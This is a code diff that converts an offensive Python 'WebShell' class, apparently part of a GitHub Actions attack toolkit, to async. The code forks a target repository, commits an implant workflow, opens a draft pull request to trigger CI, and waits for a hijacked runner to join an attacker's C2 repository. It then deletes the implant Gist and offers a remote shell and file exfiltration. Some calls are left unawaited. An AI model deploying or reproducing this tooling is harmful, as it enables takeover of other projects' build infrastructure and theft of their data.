@@ -47,7 +47,7 @@ class WebShell(Attacker):
 
     LINE_PATTERN = re.compile(r"^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{7}Z\s(.*)$")
 
-    def setup_payload_gist_and_workflow(
+    async def setup_payload_gist_and_workflow(
         self, c2_repo, target_os, target_arch, keep_alive=False
     ):
         """
@@ -66,7 +66,7 @@ class WebShell(Attacker):
         - tuple: A tuple containing the Gist ID and the URL of the created Gist.
         """
 
-        ror_gist = self.format_ror_gist(
+        ror_gist = await self.format_ror_gist(
             c2_repo, target_os, target_arch, keep_alive=keep_alive
         )
 
@@ -74,7 +74,7 @@ class WebShell(Attacker):
             Output.error("Failed to format runner-on-runner Gist!")
             return None, None
 
-        gist_id, gist_url = self.create_gist("runner", ror_gist)
+        gist_id, gist_url = await self.create_gist("runner", ror_gist)
 
         if not gist_url:
             return None, None
@@ -83,7 +83,7 @@ class WebShell(Attacker):
 
         return gist_id, gist_url
 
-    def payload_only(
+    async def payload_only(
         self,
         target_os: str,
         target_arch: str,
@@ -94,15 +94,15 @@ class WebShell(Attacker):
         run_name: str = "Testing",
     ):
         """Generates payload gist and prints RoR workflow."""
-        self.setup_user_info()
+        await self.setup_user_info()
 
         if not c2_repo:
-            c2_repo = self.configure_c2_repository()
+            c2_repo = await self.configure_c2_repository()
             Output.info(f"Created C2 repository: {Output.bright(c2_repo)}")
         else:
             Output.info(f"Using provided C2 repository: {Output.bright(c2_repo)}")
 
-        _, gist_url = self.setup_payload_gist_and_workflow(
+        _, gist_url = await self.setup_payload_gist_and_workflow(
             c2_repo, target_os, target_arch, keep_alive=keep_alive
         )
 
@@ -117,7 +117,7 @@ class WebShell(Attacker):
         Output.info("RoR Workflow below:\n")
         print(ror_workflow)
 
-    def runner_on_runner(
+    async def runner_on_runner(
         self,
         target_repo: str,
         target_branch: str,
@@ -137,7 +137,7 @@ class WebShell(Attacker):
 
         This feature uses the pure git database API to perform operations.
         """
-        self.setup_user_info()
+        await self.setup_user_info()
 
         if not self.user_perms:
             return False
@@ -151,12 +151,12 @@ class WebShell(Attacker):
             return False
 
         if not c2_repo:
-            c2_repo = self.configure_c2_repository()
+            c2_repo = await self.configure_c2_repository()
             Output.info(f"Created C2 repository: {Output.bright(c2_repo)}")
         else:
             Output.info(f"Using provided C2 repository: {Output.bright(c2_repo)}")
 
-        gist_id, gist_url = self.setup_payload_gist_and_workflow(
+        gist_id, gist_url = await self.setup_payload_gist_and_workflow(
             c2_repo, target_os, target_arch, keep_alive=keep_alive
         )
 
@@ -169,7 +169,7 @@ class WebShell(Attacker):
             f"user: {Output.bright(self.user_perms['user'])}!"
         )
 
-        res = self.api.get_repo_branch(target_repo, target_branch)
+        res = await self.api.get_repo_branch(target_repo, target_branch)
         if res == 0:
             Output.error(f"Target branch, {target_branch}, does not exist!")
             return False
@@ -177,13 +177,13 @@ class WebShell(Attacker):
             Output.error("Failed to check for target branch!")
             return False
 
-        repo_name = self.api.fork_repository(target_repo)
+        repo_name = await self.api.fork_repository(target_repo)
         if not repo_name:
             Output.error("Error while forking repository!")
             return False
 
         for i in range(self.timeout):
-            status = self.api.get_repository(repo_name)
+            status = await self.api.get_repository(repo_name)
             if status:
                 Output.result(f"Successfully created fork: {repo_name}!")
                 time.sleep(5)
@@ -196,7 +196,7 @@ class WebShell(Attacker):
             return False
 
         # Commit implantation workflow on fork, removing all other workflow files.
-        status = self.api.commit_workflow(
+        status = await self.api.commit_workflow(
             repo_name,
             source_branch,
             ror_workflow.encode(),
@@ -221,7 +221,7 @@ class WebShell(Attacker):
             return False
 
         Output.info("Creating draft pull request!")
-        pull_url = self.api.create_pull_request(
+        pull_url = await self.api.create_pull_request(
             repo_name,
             source_branch,
             target_repo,
@@ -244,7 +244,7 @@ class WebShell(Attacker):
         )
 
         for i in range(self.timeout):
-            workflow_id = self.api.get_recent_workflow(
+            workflow_id = await self.api.get_recent_workflow(
                 target_repo, "", yaml_name, time_after=f">{curr_time}"
             )
             if workflow_id == -1:
@@ -261,25 +261,25 @@ class WebShell(Attacker):
             return
 
         Output.info("Closing pull request!")
-        close_res = self.api.backtrack_head(repo_name, source_branch, 1)
+        close_res = await self.api.backtrack_head(repo_name, source_branch, 1)
         if close_res:
             Output.result("Successfully closed pull request!")
         else:
             Output.error("Failed to close pull request!")
 
         # Get workflow status
-        status = self.api.get_workflow_status(target_repo, workflow_id)
+        status = await self.api.get_workflow_status(target_repo, workflow_id)
         if status == -1:
             Output.warn("Workflow requires approval!")
             Output.warn("Waiting until timeout in case of approval via other means.")
         else:
             Output.info("Polling for runners!")
         for i in range(self.timeout):
-            runners = self.api.get_repo_runners(c2_repo)
+            runners = await self.api.get_repo_runners(c2_repo)
             if runners:
                 Output.owned("Runner connected to C2 repository!")
                 Output.info("Deleting implantation Gist.")
-                self.api.call_delete(f"/gists/{gist_id}")
+                await self.api.call_delete(f"/gists/{gist_id}")
                 self.interact_webshell(c2_repo, runner_name=runners[0]["name"])
                 break
             else:
@@ -288,7 +288,7 @@ class WebShell(Attacker):
             Output.warn("No runners connected to C2 repository!")
             return False
 
-    def interact_webshell(self, c2_repo: str, runner_name: str = None):
+    async def interact_webshell(self, c2_repo: str, runner_name: str = None):
         """Interacts with the webshell to issue commands."""
 
         self.setup_user_info()
@@ -303,7 +303,7 @@ class WebShell(Attacker):
             username = self.user_perms["user"]
             c2_repo = f"{username}/{c2_repo}"
 
-        runners = self.api.get_repo_runners(c2_repo)
+        runners = await self.api.get_repo_runners(c2_repo)
         if runners:
             runner_name = runners[0]["name"]
         else:
@@ -367,17 +367,17 @@ class WebShell(Attacker):
         except KeyboardInterrupt:
             print("Exiting shell...")
 
-    def configure_c2_repository(self):
+    async def configure_c2_repository(self):
         """Configures a C2 repository and returns the repository name along with
         the runner registration token.
         """
         random_name = "".join(random.choices(string.ascii_letters, k=10))
 
         # Create private repository in the user's personal account.
-        repo_name = self.api.create_repository(random_name)
+        repo_name = await self.api.create_repository(random_name)
 
         if repo_name:
-            self.api.commit_file(
+            await self.api.commit_file(
                 repo_name,
                 "main",
                 ".github/workflows/webshell.yml",
@@ -389,7 +389,7 @@ class WebShell(Attacker):
             Output.error("Unable to create C2 repository!")
             return None
 
-    def format_ror_gist(
+    async def format_ror_gist(
         self,
         c2_repo: string,
         target_os: string,
@@ -399,7 +399,7 @@ class WebShell(Attacker):
         """Configures a Gist file used to install the runner-on-runner implant."""
 
         # Get latest actions/runner version for arch and OS.
-        releases = self.api.call_get(
+        releases = await self.api.call_get(
             "/repos/actions/runner/releases", params={"per_page": 1}
         )
 
@@ -410,7 +410,7 @@ class WebShell(Attacker):
 
             # File name varies by OS.
             release_file = f"actions-runner-{target_os}-{target_arch}-{version}.{target_os == 'win' and 'zip' or 'tar.gz'}"
-            token_resp = self.api.call_post(
+            token_resp = await self.api.call_post(
                 f"/repos/{c2_repo}/actions/runners/registration-token"
             )
             if token_resp.status_code == 201:
@@ -451,7 +451,7 @@ class WebShell(Attacker):
             Output.error("Unable to retrieve runner version!")
             return None
 
-    def issue_command(
+    async def issue_command(
         self,
         c2_repo,
         parameter,
@@ -496,7 +496,7 @@ class WebShell(Attacker):
             .replace(microsecond=0)
             .isoformat()
         )
-        success = self.api.issue_dispatch(
+        success = await self.api.issue_dispatch(
             c2_repo,
             target_workflow=workflow_name,
             target_branch="main",
@@ -505,13 +505,13 @@ class WebShell(Attacker):
 
         if success:
             time.sleep(5)
-            resp = self.api.call_get(
+            resp = await self.api.call_get(
                 f"/repos/{c2_repo}/commits", params={"per_page": 1}
             )
             if resp.status_code == 200:
 
                 for i in range(timeout):
-                    workflow_id = self.api.get_recent_workflow(
+                    workflow_id = await self.api.get_recent_workflow(
                         c2_repo,
                         resp.json()[0]["sha"],
                         "webshell",
@@ -529,7 +529,7 @@ class WebShell(Attacker):
                     return
 
                 for i in range(self.timeout):
-                    status = self.api.get_workflow_status(c2_repo, workflow_id)
+                    status = await self.api.get_workflow_status(c2_repo, workflow_id)
                     if status == -1 or status == 1:
                         # We just need it to finish.
                         break
@@ -544,7 +544,7 @@ class WebShell(Attacker):
 
                 # If downloading file, then download and don't try to parse run log.
                 if download:
-                    dest = self.api.download_workflow_artifact(
+                    dest = await self.api.download_workflow_artifact(
                         c2_repo, workflow_id, f"{str(workflow_id)}_exfil.zip"
                     )
 
@@ -555,7 +555,7 @@ class WebShell(Attacker):
                 else:
                     #  Download the run logs. Iterate lines until
                     #  we see "2024-06-14T15:20:38.9545224Z   RUNNER_TRACKING_ID: 0"
-                    runlog = self.api.retrieve_workflow_log(
+                    runlog = await self.api.retrieve_workflow_log(
                         c2_repo, workflow_id, "build"
                     )
                     content_lines = runlog.split("\n")
@@ -578,9 +578,9 @@ class WebShell(Attacker):
         else:
             Output.error("Unable to issue command!")
 
-    def list_runners(self, c2_repo):
+    async def list_runners(self, c2_repo):
         """Lists all runners connected to the C2 repository."""
-        runners = self.api.get_repo_runners(c2_repo)
+        runners = await self.api.get_repo_runners(c2_repo)
 
         if runners:
 
